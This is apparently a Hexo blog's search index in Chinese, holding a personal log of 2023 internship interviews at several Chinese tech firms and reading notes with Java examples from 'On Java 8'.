<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>八股</title>
      <link href="/2023/09/11/%E6%9D%82%E8%AE%B0/%E5%85%AB%E8%82%A1/"/>
      <url>/2023/09/11/%E6%9D%82%E8%AE%B0/%E5%85%AB%E8%82%A1/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content>
      
      
      <categories>
          
          <category> 文章 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>面试记录</title>
      <link href="/2023/08/16/%E6%9D%82%E8%AE%B0/%E9%9D%A2%E8%AF%95%E7%BB%8F%E9%AA%8C/"/>
      <url>/2023/08/16/%E6%9D%82%E8%AE%B0/%E9%9D%A2%E8%AF%95%E7%BB%8F%E9%AA%8C/</url>
      
        <content type="html"><![CDATA[<h2 id="%E9%98%BF%E9%87%8C" tabindex="-1">阿里</h2><h3 id="2023%E5%AE%9E%E4%B9%A0%E9%98%BF%E9%87%8Cc%2B%2B%E5%AE%A2%E6%88%B7%E7%AB%AF" tabindex="-1">2023实习阿里C++客户端</h3><h4 id="%E7%AC%94%E8%AF%95" tabindex="-1">笔试</h4><p>408+ACM算法</p><h4 id="%E4%B8%80%E9%9D%A2" tabindex="-1">一面</h4><ul><li><p>自我介绍</p></li><li><p>手写栈，队列，优先队列，延迟队列。</p></li><li><p>tcp和udp关系</p></li><li><p>三次握手时，最后发送方没收到ack有哪些原因</p></li><li><p>c++和Java区别关系。</p></li><li><p>c11特性新特性</p></li><li><p>面向对象几个特性最重要的是哪个，为什么</p></li><li><p>进程和线程。</p></li><li><p>线程并发控制。</p></li><li><p>进程通讯。</p></li><li><p>github看过的项目那个最有趣，修的课那个最有趣</p></li><li><p>算法：给2n个数，分成两组，每组n个数，使得和最接近</p></li><li><p>总结：第一次面试，八股文就没准备，全靠平时基础，而且很紧张，但不知道为什么还能二面，但是最近也比较忙，八股文还是没时间背，急急急，看二面能运气过不</p></li></ul><h4 id="%E4%BA%8C%E9%9D%A2" tabindex="-1">二面</h4><ul><li>自我介绍</li><li>项目介绍</li><li>谈学习方法</li><li>C++和JAVA</li><li>聊天</li></ul><p>这次感觉还行，没问八股啥的，总体来说不是很紧张，可惜第二天反手就挂了，乐，简历又回归人才库继续转了</p><h2 id="%E8%85%BE%E8%AE%AF" tabindex="-1">腾讯</h2><h3 id="2023-wxg-%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91%E5%AE%9E%E4%B9%A0" tabindex="-1">2023 WXG 后端开发实习</h3><p>简历过了后就直接到面试了</p><h4 id="%E4%B8%80%E9%9D%A2-1" tabindex="-1">一面</h4><p>自我介绍</p><p>在线写题：</p><ol><li>给定一个字符串A和一个字符串集合B，找到B中字符串在A中的索引出现位置并标记出来（直接暴力）</li><li>实现一个单例模式，要求线程安全，懒汉模式</li><li>寻找二叉搜索树中的第三大值</li><li>反转链表</li></ol><p>八股：OS系统调用，计网MTU，C++多态实现</p><p>一面完直接挂了，真不戳，当时面的时候面试官找题找了10min+，还在跟别人聊天，看来对我确实是不上心了，虽然我也很菜</p><h2 id="%E5%8D%8E%E4%B8%BA" tabindex="-1">华为</h2><h3 id="2023-bg%E7%BB%88%E7%AB%AF%E7%A1%AC%E4%BB%B6-%E5%AE%9E%E4%B9%A0" tabindex="-1">2023 BG终端硬件 实习</h3><p>当时忘改第一志愿部门了，之后发现改不了了，硬着头皮面了，蚌，确实是硬件，贴近底层</p><p>自我介绍；<br>关于自我介绍聊了会天；<br>询问项目；</p><p>共享屏幕写题：一个超大文件，无法完全放入内存，请使用C++总计该文件bit流中的1的个数</p><p>chatgpt解答：在处理一个超大文件时，无法将整个文件加载到内存中。为了计算该文件中的1的个数，你可以使用逐位读取的方式来统计。以下是一个使用C++编写的示例代码：</p><pre><code class="language-C++">#include &lt;iostream&gt;#include &lt;fstream&gt;// 计算一个整数中的1的个数int countOnes(unsigned int num) &#123;    int count = 0;    while (num) &#123;        count += num &amp; 1;        num &gt;&gt;= 1;    &#125;    return count;&#125;int main() &#123;    std::ifstream file(&quot;path/to/your/file.bin&quot;, std::ios::binary);    if (!file) &#123;        std::cout &lt;&lt; &quot;Failed to open the file.&quot; &lt;&lt; std::endl;        return 1;    &#125;    unsigned char byte;    unsigned long long totalCount = 0;    // 逐字节读取文件内容    while (file.read(reinterpret_cast&lt;char*&gt;(&amp;byte), sizeof(byte))) &#123;        // 计算每个字节中1的个数并累加        totalCount += countOnes(byte);    &#125;    file.close();    std::cout &lt;&lt; &quot;Total count of 1s: &quot; &lt;&lt; totalCount &lt;&lt; std::endl;    return 0;&#125;</code></pre><p>这种文件读入确实不会，算是硬件岗吧，果然直接挂了，期望其它志愿可以面到</p><h2 id="%E5%B0%8F%E7%B1%B3" tabindex="-1">小米</h2><h3 id="2023-java%E7%A8%8B%E5%BA%8F%E5%BC%80%E5%8F%91-%E5%AE%9E%E4%B9%A0" tabindex="-1">2023 Java程序开发 实习</h3><p>简历过了直接面试。<br>聊了项目，问了java Hashtable那一系列，多线程等，我确实基础不太行，最后面试官说明希望是一个基础牢固的，过来可以直接开发的实习生，所以潜意思应该是我不太行了，最后也是很快就挂了，不过处于流程还是要写代码的。</p><p>代码题：问有n个数，范围为[0-n]，每个数各不相同，问如何直到哪个数没有<br>解法：将所有数求和用n*(n+1)/2减去即是答案</p><h2 id="%E5%AD%97%E8%8A%82" tabindex="-1">字节</h2><h3 id="2023-%E9%A3%9E%E4%B9%A6%E5%90%8E%E7%AB%AF%E6%97%A5%E5%B8%B8%E5%AE%9E%E4%B9%A0" tabindex="-1">2023 飞书后端日常实习</h3><h4 id="%E4%B8%80%E9%9D%A2-2" tabindex="-1">一面</h4><ul><li><p>自我介绍</p></li><li><p>算法题：</p><ul><li>题目：将一个字符串的大小写字母转换，输出所有可能转换的字符串</li><li>做法：直接dfs回溯即可</li></ul></li><li><p>聊项目</p></li><li><p>八股</p><ul><li>计网<ul><li>HTTPS，SSL加密过程</li><li>HTTP请求的全过程（DNS服务器）</li><li>TCP/IP协议 传输信息的过程</li><li>TCP/IP协议 中帧的各请求头的信息</li><li>网络攻击手段：DDOS，反射</li></ul></li><li>操作系统<ul><li>如何让CPU满载</li><li>CPU利用率</li></ul></li><li>数据库<ul><li>索引的数据结构</li><li>隔离等级</li></ul></li></ul></li><li><p>哎，八股太差了，看过的记不住</p></li></ul><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content>
      
      
      <categories>
          
          <category> 文章 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>On java 8 基础卷（8-14章）</title>
      <link href="/2023/08/16/PL/On%20java8%E5%9F%BA%E7%A1%80%E5%8D%B78-14/"/>
      <url>/2023/08/16/PL/On%20java8%E5%9F%BA%E7%A1%80%E5%8D%B78-14/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/PL/OnJava8/x_x.jpg" alt></p><h2 id="8-%E5%A4%8D%E7%94%A8" tabindex="-1">8 复用</h2><h3 id="8.1-%E7%BB%84%E5%90%88%E8%AF%AD%E6%B3%95" tabindex="-1">8.1 组合语法</h3><ul><li>组合:将对象引用放入新类中即可</li><li>初始化引用有以下4中方式<ul><li><ol><li>在定义时立刻初始化</li></ol></li><li><ol start="2"><li>在类的构造器中</li></ol></li><li><ol start="3"><li>在对象实际使用之前</li></ol></li><li><ol start="4"><li>使用实例初始化</li></ol></li></ul></li></ul><pre><code class="language-java">class Soap &#123;  private String s;  Soap() &#123;//2 构造器初始化    System.out.println(&quot;Soap()&quot;);    s = &quot;Constructed&quot;;  &#125;  @Override public String toString() &#123; return s; &#125;&#125;public class Bath &#123;  private String // 1. 立即初始化    s1 = &quot;Happy&quot;,    s2 = &quot;Happy&quot;,    s3, s4;  private Soap castile;  private int i;  private float toy;  public Bath() &#123;    System.out.println(&quot;Inside Bath()&quot;);    s3 = &quot;Joy&quot;;    toy = 3.14f;    castile = new Soap();  &#125;  // 实例初始化  &#123; i = 47; &#125;  @Override public String toString() &#123;    if(s4 == null) // 延迟初始化      s4 = &quot;Joy&quot;;    return      &quot;s1 = &quot; + s1 + &quot;\n&quot; +      &quot;s2 = &quot; + s2 + &quot;\n&quot; +      &quot;s3 = &quot; + s3 + &quot;\n&quot; +      &quot;s4 = &quot; + s4 + &quot;\n&quot; +      &quot;i = &quot; + i + &quot;\n&quot; +      &quot;toy = &quot; + toy + &quot;\n&quot; +      &quot;castile = &quot; + castile;  &#125;  public static void main(String[] args) &#123;    Bath b = new Bath();    System.out.println(b);  &#125;&#125;/* Output:Inside Bath()Soap()s1 = Happys2 = Happys3 = Joys4 = Joyi = 47toy = 3.14castile = Constructed*/</code></pre><h3 id="8.2-%E7%BB%A7%E6%89%BF%E8%AF%AD%E6%B3%95" tabindex="-1">8.2 继承语法</h3><ul><li>创建一个类时,如无指定继承对象,将会隐式继承标准根类Object</li><li>Java只允许单继承</li><li>继承通过关键字<code>extends</code>后跟基类实现,此时自动获得基类的所有字段和方法</li><li>通过<code>super</code>关键字,来指代当前类继承的&quot;基类&quot;的</li></ul><h4 id="%E5%88%9D%E5%A7%8B%E5%8C%96%E5%9F%BA%E7%B1%BB" tabindex="-1">初始化基类</h4><ul><li><p>对于子类和基类,当创建子类对象时,其里面包含了一个基类的<code>子对象</code>(subobject),该子对象等同于直接创建基类对象,只是该对象被包括在子对象中</p></li><li><p>Java会自动在子类构造其中插入对基类构造器的调用<br><img src="/images/PL/OnJava8/8_2_1.png" alt></p></li><li><p>对于带参的构造器,需要使用super关键字和对应的参数列表,来显式的调用基类构造器,否则编译报错</p></li></ul><p><img src="/images/PL/OnJava8/8_2_2.png" alt></p><h3 id="8.3-%E5%A7%94%E6%89%98" tabindex="-1">8.3 委托</h3><ul><li><p>第三种关系<code>委托(delegation)</code>,介于继承和组合之间</p><ul><li>将成员对象放在构建的类中(类似组合),但同时在新类中公开了成员对象的所有方法(类似继承)</li></ul></li><li><p>例子:对于一艘太空船需要一个控制模块,这里使用继承方法,但逻辑上讲不通,而组合方法中,不能通过太空船直接掉用到控制模块的方法,此时可以使用委托</p></li><li><p>这里相当于方法调用被转发到了内部的controls对象,这里的接口与继承得到的接口相同</p><ul><li><strong>但是</strong>,这里可以更好的控制委托,因为这里可以选择仅提供成员对象的部分方法,比如控制模块的一些不能暴露给飞船控制人员的方法</li></ul></li></ul><pre><code class="language-java">public class SpaceShipDelegation &#123;  private String name;  private SpaceShipControls controls =    new SpaceShipControls();  public SpaceShipDelegation(String name) &#123;    this.name = name;  &#125;  // Delegated methods 委托方法:  public void back(int velocity) &#123;    controls.back(velocity);  &#125;  public void down(int velocity) &#123;    controls.down(velocity);  &#125;  public void forward(int velocity) &#123;    controls.forward(velocity);  &#125;  public void left(int velocity) &#123;    controls.left(velocity);  &#125;  public void right(int velocity) &#123;    controls.right(velocity);  &#125;  public void turboBoost() &#123;    controls.turboBoost();  &#125;  public void up(int velocity) &#123;    controls.up(velocity);  &#125;  public static void main(String[] args) &#123;    SpaceShipDelegation protector =      new SpaceShipDelegation(&quot;NSEA Protector&quot;);    protector.forward(100);  &#125;&#125;</code></pre><h3 id="8.4-%E7%BB%84%E5%90%88%E4%B8%8E%E7%BB%A7%E6%89%BF%E7%9B%B8%E7%BB%93%E5%90%88" tabindex="-1">8.4 组合与继承相结合</h3><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>On java 8 基础卷（1-7章）</title>
      <link href="/2023/06/25/PL/On%20java8%E5%9F%BA%E7%A1%80%E5%8D%B71-7/"/>
      <url>/2023/06/25/PL/On%20java8%E5%9F%BA%E7%A1%80%E5%8D%B71-7/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/PL/OnJava8/x_x.jpg" alt></p><p>[toc]</p><h2 id="0-%E5%AF%BC%E8%AF%BB" tabindex="-1">0 导读</h2><ul><li><p>摘要：</p><ul><li>本书是布鲁斯 • 埃克尔时隔 15 年，继 Thinking in Java 之后又一力作，基于 Java 的 3 个长期支持版（Java 8、11、17），讲解 Java 核心语法，并对 Java 的核心变化进行详述。全书内容通俗易懂，配合示例讲解逐步深入，并结合实际开发需要，从语言底层设计出发，有效帮读者规避一些常见的开发陷阱。</li><li>主体部分共 22 章，内容包含对象、操作符、控制流、初始化和清理、复用、多态、接口、内部类、集合、函数式编程、流、异常、代码校验、文件、字符串、泛型等。</li><li>本书适合各个层次的 Java 开发者阅读，同时也可作为面向对象程序设计语言以及 Java 语言的参考教材。</li></ul></li><li><p>这是一本2022年的新书</p></li><li><p>Java 是一门派生语言。当时的情况是，早期的语言设计师不想用 C++ 来开发项目，于是创建了一门和 C++ 极为相似的新编程语言，不过也做出了一些改进。这种新编程语言最主要的改动是加入了虚拟机和垃圾收集机制，本书后续章节会对这两点进行详细介绍。</p></li><li><p>语言设计缺陷：PL都有缺陷，但是术业有专攻，合适场景用合适的语言</p></li><li><p>普及程度：java已然大量普及</p></li><li><p>java的发布节奏</p><ul><li><ol><li>每隔6个月发布一个新版本，使用整数作为版本号</li></ol></li><li><ol start="2"><li>发布的版本会包含一些试用功能，让用户可以体验和指出问题。而这种 6 个月的版本节奏，其主要目的可能就在于让用户尽早发现功能试用的相关问题。不过，由于无法保证这些功能之后能够长期存在，一旦这些功能出于某些原因没有达成预期的效果，它们就会被取缔。所以，你不应该依赖这些试用性质的功能。</li></ol></li><li><ol start="3"><li>STS和LTS：Java 8、11、17 都是 LTS 版本，其他版本则是支持周期只有 6 个月的 STS 版本。具体而言，只要有新版本问世，对 STS 版本的支持即宣告终止。类似地，一旦有新的 LTS版本问世，（通常在一年以内）很快也会停止对原 LTS 版本的支持（这里指的是 Oracle 所提供的免费支持，也就是说，OpenJDK 可能会支持更长时间）。</li></ol><ul><li>Short-Term-Support STS 短期支持</li><li>Long-Term-Support LTS 长期支持</li></ul></li></ul></li><li><p>图像用户界面</p><ul><li>Java1.0通过抽象窗口工具集（Abstract Windowing Toolkit, AWT）创建了一种在所有平台上都表现平平的 GUI。</li><li>归根结底，Java 在桌面领域从未真正强大过，甚至从未触及设计师的雄心壮志。</li><li>结果就是，Java 在桌面领域的大多数应用场景是 IDE 以及一些企业内部的应用程序。虽然人们确实也会用 Java 开发用户界面，但要清楚地意识到，这只是 Java 语言的一个小众需求。</li></ul></li><li><p>JDK HTML文档：Oracle 公司为 Java 开发工具集（Java Development Kit, JDK）提供了电子文档，用Web 浏览器即可查看。</p></li><li><p>经过测试的示例：本书创建了一套测试系统，用于展示和验证大多数示例的输出结果。</p></li><li><p><a href="https://github.com/BruceEckel/Onjava8-examples"><strong>源代码</strong></a></p></li></ul><h2 id="01-%E4%BB%80%E4%B9%88%E6%98%AF%E5%AF%B9%E8%B1%A1" tabindex="-1">01 什么是对象</h2><h3 id="1.1-%E6%8A%BD%E8%B1%A1%E7%9A%84%E5%8E%86%E7%A8%8B" tabindex="-1">1.1 抽象的历程</h3><ul><li><p>所有编程语言都是一种抽象</p><ul><li>汇编语言是对计算机底层的一个极简化的抽象</li><li>命令式编程语言（FORTRAN，BASIC，C等）都是对汇编语言的抽象</li><li>然而以上的抽象方式要求根据计算机的结构而非问题的结构来思考</li></ul></li><li><p>构建机器模型的一种替代方式是根据问题构建问题模型，例如</p><ul><li>Prolog语言将所有问题都转换为决策链</li><li>这些编程语言具有强烈的专业性</li></ul></li><li><p>面向对象编程更进一步，具备了更强的通用性</p><ul><li>通过添加新的对象，程序可以将自己改编为一种描述问题的语言：于此，阅读代码即是阅读表述问题的文字</li></ul></li><li><p>SmallTalk是第一门获得成功的面向对象的编程语言，并未Java的出现提供了灵感。Alan Kay总结了该语言的5个特征</p><ul><li><ol><li>万物皆对象</li></ol></li><li><ol start="2"><li>一段对象实际上是对个对象通过发送消息来通知彼此之间要干什么</li></ol></li><li><ol start="3"><li>从内存角度而言，每一个对象都是由其它更为基础的对象组成的</li></ol></li><li><ol start="4"><li>每一个对象都有类型</li></ol></li><li><ol start="5"><li>同一类型的对象可以接收相同的消息</li></ol></li></ul></li><li><p>Grady Booch更为简洁的描述：对象具有状态，行为和标识</p><ul><li>这意味着，对象可以拥有自己的内部属性（状态），方法（用于产生行为），同时每一个对象都有唯一的地址（标识）</li></ul></li></ul><h3 id="1.2-%E5%AF%B9%E8%B1%A1%E5%85%B7%E6%9C%89%E6%8E%A5%E5%8F%A3" tabindex="-1">1.2 对象具有接口</h3><ul><li>类描述了一系列具有相同特征（即数据元素）和行为（即功能方法）的对象</li><li>类其实就是一种抽象的数据类型</li><li>一个类可以创建多个对象</li><li>一个对象能接受什么请求，由其&quot;接口&quot;决定<ul><li>类中定义了&quot;接口&quot;</li><li>接口的响应代码和数据称为&quot;实现&quot;</li></ul></li></ul><h3 id="1.3-%E5%AF%B9%E8%B1%A1%E5%8F%AF%E4%BB%A5%E6%8F%90%E4%BE%9B%E6%9C%8D%E5%8A%A1" tabindex="-1">1.3 对象可以提供服务</h3><ul><li>将对象想象成“服务提供者”<ul><li>提升对象内聚程度</li><li>复用或创建一些提供对应服务以解决问题的对象</li></ul></li></ul><h3 id="1.4-%E9%9A%90%E8%97%8F%E7%9A%84%E5%AE%9E%E7%8E%B0" tabindex="-1">1.4 隐藏的实现</h3><ul><li><p>程序员分为两类</p><ul><li>类的创建者：创建新数据类型的人，暴露必要的接口给客户程序员，隐藏其它不必要的信息</li><li>客户程序员：使用现有数据类型的人，其诉求是通过工具类快速开发应用程序</li></ul></li><li><p>设置访问控制的原因</p><ul><li><ol><li>防止客户程序员接触到他们不该触碰的内容，即用于数据类型内部运转的代码</li></ol></li><li><ol start="2"><li>让库的设计者再改变类的内部工作机制时，不用担心影响到使用该类的客户程序员</li></ol></li></ul></li><li><p>Java提供了3个显示关键字，即访问修饰符（access specifier）</p><ul><li>public：定义的内容可以被所有人访问</li><li>private：内容只能通过类的创建者通过类自身的方法访问，其他人无法访问</li><li>protected：继承的子类可以访问到protected成员，但不能访问到private成员</li></ul></li><li><p>如果不适用修饰符，Java提供一种默认的访问权限：包访问，即一个类可以访问同一个包中的其他类，外部不可访问</p></li></ul><h3 id="1.5-%E5%A4%8D%E7%94%A8%E5%AE%9E%E7%8E%B0" tabindex="-1">1.5 复用实现</h3><ul><li><p>代码复用是我们使用面向对象的编程的一个重要理由</p></li><li><p>新创建的类可以使用任意数量的类型和对象组成，也可以任意组合这些对象，实现想要的功能。</p></li><li><p>利用已有的类组合成一个类，这个概念叫做“组合”（composition）</p><ul><li>组合通常代表一种有的关系，比如“汽车有发动机”</li><li>如果组合是动态的，称为聚合（aggregation）。</li></ul></li><li><p>组合和聚合的区别</p><ul><li>聚合：表示两个对象之间是整体和部分的弱关系，部分的生命周期可以超越整体，比如电脑和鼠标</li><li>组合：表示两个对象之间是整体和部分的强关系，部分的生命周期不能超越整体，或者说不能脱离整体的存在，比如汽车和发动机。</li></ul></li></ul><h3 id="1.6-%E7%BB%A7%E6%89%BF" tabindex="-1">1.6 继承</h3><ul><li>通过继承，子类可以获得父类的属性和方法，而无需重新编写相同的代码。</li><li>子类可以扩展或修改继承自父类的行为，并可以定义自己特有的属性和方法。<ul><li>扩展（extend）和重写</li></ul></li><li>这样，继承提供了一种层次化的类组织方式，使得代码更加模块化和易于维护。</li></ul><h3 id="1.7-%E5%A4%9A%E6%80%81" tabindex="-1">1.7 多态</h3><ul><li><p>对非面向对象编译器：其生成的函数调用会触发“前期绑定”（early binding），意味着编译器会生成对一个具体方法名的调用，该方法名决定了被执行代码的绝对地址。</p></li><li><p>面向对象语言使用机制“后期绑定”（late binding），当你想某个对象发送消息时，知道运行时才会确定那一段代码被调用</p></li><li><p>Java通过特殊方法实现后期绑定，通俗说，当向一个对象啊发消息时，该对象自己会找到解决之道</p></li><li><p>C++中，必须通过virtual 关键字来达到这些目的，因为方法并不具备 默认动态绑定特性，而java默认具有动态绑定的特性，所以无需借助关键字和代码实现多态</p></li></ul><h3 id="1.8-%E5%8D%95%E6%A0%B9%E5%B1%82%E6%AC%A1%E7%BB%93%E6%9E%84" tabindex="-1">1.8 单根层次结构</h3><ul><li>Java中所有的类默认继承自一个终极基类，名字Object</li><li>单根层次结构具备很多优势<ul><li><ol><li>所有对象具有共同的接口，因为属于同一个终极基类</li></ol><ul><li>C++无法保证所有对象属于同一个聚类，从兼容的角度看，这种限制性小的设计对C语言友好，但从面向对象思想的计财处看，必须手动构建类的层次，才能拥有其它面向对象编程语言具有的便捷性</li><li>此外，使用任何新的库时，可能会有不兼容的接口</li><li>C++的灵活性物有所值吗？<ul><li>如果已经花费大量心血编写了C代码，那么答案是肯定的，如果是从头开始，那么使用Java或其它方案会高效很多</li></ul></li></ul></li><li><ol start="2"><li>有利于垃圾回收：这是Java对C++的巨大改进</li></ol></li></ul></li></ul><h3 id="1.9-%E9%9B%86%E5%90%88" tabindex="-1">1.9 集合</h3><ul><li><p>集合：（也可称为容器），会根据你放入其中的内容自行调整通奸。</p></li><li><p>C++中，集合是STL（Standard Template Library 标准模板库）中的一部分，Java也在标准库中提供了大量的集合</p></li><li><p>从程序设计角度，真正需要的是能解决实际问题的集合，选择不同的集合只要有以下零个原因</p><ul><li><ol><li>不同的集合提供了不同类型的接口和行为。</li></ol><ul><li>比如，栈和队列的用途就和Set及List完全不同</li></ul></li><li><ol start="2"><li>不同的集合和特定操作的执行效率有差异</li></ol><ul><li>比如，List的两种基础类型ArrayList，LinkedList，一个是序列列表，一个是链式列表</li></ul></li></ul></li><li><p>参数化类型（泛型）</p><ul><li>因为单根层次结构决定了所有对象属于Object类型，所以一个持有Object的集合可以持有任何对象，使得集合十分易于复用</li><li>然而此时将对象都转型成了Object，取出时需要向下转型，除非明确知道向下转型的具体类型，否则向下转型是不安全的</li><li>Java5引入的特性：支持参数化类型，也称泛型（generics）。可以通过再一堆叫括号中间加上类名来定义泛型</li><li><code>ArrayList&lt;Shape&gt; shape = new ArrayList();</code></li></ul></li></ul><h3 id="1.10-%E5%AF%B9%E8%B1%A1%E5%88%9B%E5%BB%BA%E5%92%8C%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F" tabindex="-1">1.10 对象创建和生命周期</h3><ul><li><p>C++语言的总之时效率有限，所以其对象数据保存交给程序员来管理</p><ul><li>如果要最大化运行效率，可以通过栈区保存对象，或者保存在静态存储区中，这种做法优先考虑分配和释放内存的速度。代价是牺牲了灵活性，必须在编写代码时明确对象的数量，生命周期等</li><li>另外可以在内存池中动态创建对象，这个内存池称为“堆”。该方案知道运行时才能知道需要多少对象，及对象的生命周期和确切的类型，并且堆是在运行是动态管理内存的，所以对分配内存的时间比栈多。</li></ul></li><li><p>动态创建对象是普遍存在的，其基于一个普遍接受的假设：对象往往是复杂的，所以你在创建对象时，查找和释放内存空间带来的额外开销不会造成严重影响。此外，更大的灵活性才是解决常规编程问题的关键。</p></li><li><p>Java只允许动态分配内存，每创建一个对象，都要使用new操作符创建一个对象的动态实例</p></li><li><p>对象的生命周期</p><ul><li>对于允许在栈上创建对象的编程语言，编译器会判断对象将会存在多久以及负责自动销毁该对象。但如果在堆上创建对象，编译器就无从得知生命周期了</li><li>对于C++，必须在编码是明确合适销毁对象，否则如果代码有问题，会造成内存泄漏，导致了许多C++项目的失败。</li><li>而Java底层支持垃圾收集器机制，会自动找到会用的对象并销毁，提供了一种更高级的保证以防止潜在的的内存泄漏</li></ul></li><li><p>Java设计垃圾收集器的意图就是处理内存释放的相关问题</p><ul><li>垃圾收集器直到一个对象何时不再使用，会自动释放对象占用的内存</li><li>并且所有对象都继承自顶层基类Object，以及只能在堆上创建对象的特点</li></ul></li><li><p>使得Java编程比C++简单不少，即程序员需要接入的决策和阻碍都大大减少</p></li></ul><h3 id="1.11-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86" tabindex="-1">1.11 异常处理</h3><ul><li><p>异常处理是将编程语言甚至是操作系统和错误处理机制直接捆绑到一起。</p><ul><li>异常时从错误发生之处“抛出”的对象，而根据错误类型，它可以被异常处理程序所“捕获”</li><li>当代码发生错误时，异常处理机制会使用一条特殊的，并行的执行路径处理这个错误，不影响正常代码的执行</li></ul></li><li><p>Java一开始就会让你接触到异常处理，并且强制你必须使用它</p></li></ul><h3 id="1.12-%E6%80%BB%E7%BB%93" tabindex="-1">1.12 总结</h3><ul><li><p>一段<strong>过程式程序</strong>包含了定义和函数调用。</p><ul><li>如果想搞明白代码做了什么，必须查看它的函数调用以及底层代码</li><li>因此，过程式程序的理解成本很高，因为其设计的表达方式更多的面向计算机</li></ul></li><li><p>面向对象编程中</p><ul><li>对象的定义所呈现的是问题空间的概念，而发送至对象的消息则代表问题的具体活动</li><li>面向对象编程的设计狼好的程序总是易于阅读的，并且复用很常见，代码行数不会太多</li></ul></li></ul><h2 id="02-%E5%AE%89%E8%A3%85java%E5%92%8C%E6%9C%AC%E4%B9%A6%E7%A4%BA%E4%BE%8B" tabindex="-1">02 安装Java和本书示例</h2><h3 id="2.1-%E7%BC%96%E8%BE%91%E5%99%A8" tabindex="-1">2.1 编辑器</h3><p>VScode or Intellij IDEA</p><h3 id="2.2-shell" tabindex="-1">2.2 shell</h3><ul><li>shell,windos称 命令提示符</li><li>目录，windows用反斜杠&quot;“而不是斜杠”&quot;/&quot;来分割一个目录</li><li>shell基础操作</li></ul><h3 id="2.3-%E5%AE%89%E8%A3%85java" tabindex="-1">2.3 安装Java</h3><ul><li>运行Java需要安装JDK（Java Development Kit，Java开发工具集）</li></ul><h3 id="2.4-%E7%A1%AE%E8%AE%A4%E5%AE%89%E8%A3%85%E6%88%90%E5%8A%9F" tabindex="-1">2.4 确认安装成功</h3><p>在shell窗口输入<code>java -version</code></p><h3 id="2.5-%E5%AE%89%E8%A3%85%E5%92%8C%E8%BF%90%E8%A1%8C%E6%9C%AC%E4%B9%A6%E7%A4%BA%E4%BE%8B" tabindex="-1">2.5 安装和运行本书示例</h3><ul><li>在Github网站下载本书的示例，随后通过gradlew run 运行程序</li></ul><h2 id="03-%E5%AF%B9%E8%B1%A1%E6%97%A0%E5%A4%84%E4%B8%8D%E5%9C%A8" tabindex="-1">03 对象无处不在</h2><h3 id="3.1-%E9%80%9A%E8%BF%87%E5%BC%95%E7%94%A8%E6%93%8D%E4%BD%9C%E5%AF%B9%E8%B1%A1" tabindex="-1">3.1 通过引用操作对象</h3><ul><li>Java将一切视为对象，程序员 实际操作的是该对象的引用</li></ul><pre><code class="language-java">String s;//创建一个引用String s=&quot;asdf&quot;//创建一个引用并进行初始化</code></pre><h3 id="3.2-%E5%BF%85%E9%A1%BB%E5%88%9B%E5%BB%BA%E6%89%80%E6%9C%89%E5%AF%B9%E8%B1%A1" tabindex="-1">3.2 必须创建所有对象</h3><ul><li>引用的作用是关联对象。通常我们使用new关键字来创建对象。</li></ul><h4 id="3.2.1-5%E7%A7%8D%E6%95%B0%E6%8D%AE%E7%9A%84%E5%AD%98%E5%82%A8%E6%96%B9%E5%BC%8F" tabindex="-1">3.2.1 5种数据的存储方式</h4><ul><li><ol><li>寄存器（register）：</li></ol><ul><li>这是最快的数据存储方式，数据会保存在中央处理器（central processing unit，CPU）里。</li><li>而寄存器数量有限，只能按需分配</li><li>除C和C++，在程序中看不到寄存器的存在</li></ul></li><li><ol start="2"><li>栈（stack）：</li></ol><ul><li>数据存储在随机存取存储器（random-access memory，RAM）里，处理器可以通过栈指针直接操作数据。</li><li>栈指针向下申请一块新的内存，向上释放内存</li><li>但在Java系统中，栈上的所有对象都有明确的生命周期，这会限制程序的灵活性</li></ul></li><li><ol start="3"><li>堆（heap）：</li></ol><ul><li>一个通用的内存池（也是RAM），存放所有的Java对象</li><li>new的对象会在堆中分配内存，且编译器不用关心堆上的对象存在多久</li><li>灵活性的代价：分配和清理堆存储比栈存储花费更多时间（但Java的堆内存分配机制已经非常高效了）</li></ul></li><li><ol start="4"><li>常量存储（constant storage）：</li></ol><ul><li>常量通常直接保存在程序代码中，因为其值不变</li><li>有时也会和其它代码分隔开，如在嵌入式系统里，常量可以存储在只读存储器（read-only memory，ROM）中</li></ul></li><li><ol start="5"><li>非RAM存储（non-RAM storage）：</li></ol><ul><li>如果一段数据没有保存在应用程序里，那么该数据的生命周期即不依赖于应用程序是否独立，也不受程序管制。</li><li>典型例子是 “序列化对象”（serialized object），指的是转换为字节流（叫做“序列化”）可以发送至其它机器的对象</li><li>另一个例子是“持久化对象”（persistent object），指的是保存在磁盘上的对象</li><li>这些对象的特点是，它们会将对象转换成其他形式以保存在其他媒介中，然后在需要的时候重新转换回RAM</li></ul></li></ul><h4 id="3.2.2-%E5%9F%BA%E6%9C%AC%E7%B1%BB%E5%9E%8B" tabindex="-1">3.2.2 基本类型</h4><ul><li>new关键字在堆上创建对象，这意味着即使是简单的变量也不会很高效</li><li>对于基本类型，java使用了和C以及C+相同的实现机制，无需使用new来创建基本类型的变量，该变量会在栈上保存它的值，因此运行效率较高</li><li><img src="/images/PL/OnJava8/3_1.jpg" 